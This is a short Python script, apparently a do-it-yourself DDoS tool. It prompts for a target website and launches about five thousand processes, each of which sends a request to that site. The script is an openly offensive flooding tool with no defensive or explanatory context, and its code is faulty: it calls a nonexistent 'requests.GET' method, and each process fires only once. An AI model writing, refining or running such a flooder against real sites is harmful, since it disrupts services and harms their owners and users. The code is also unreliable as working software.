import multiprocessing
import requests


class App:
    def __init__(self):
        self.inp = input("print website you want to DDOS")
        x = []
        for i in range(1, 5000):
            pr = multiprocessing.Process(target=self.first, args=())
            pr.start()
            x.append(pr)
        for i in x:
            i.join()

    def first(self):
        requests.GET(f"{self.inp}")

if __name__ == "__main__":
    App()